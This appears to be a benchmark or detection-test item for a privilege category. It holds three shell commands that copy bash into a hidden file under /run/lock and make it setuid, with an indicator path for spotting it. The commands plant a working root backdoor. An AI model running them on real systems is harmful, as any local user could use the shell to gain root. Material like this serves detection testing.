# category: privilege
# title: Shell setuid in /run/lock (tmpfs scrivibile da tutti)
# indicator: /run/lock/.bench-sh
mkdir -p /run/lock
cp /bin/bash /run/lock/.bench-sh
chmod 4755 /run/lock/.bench-sh
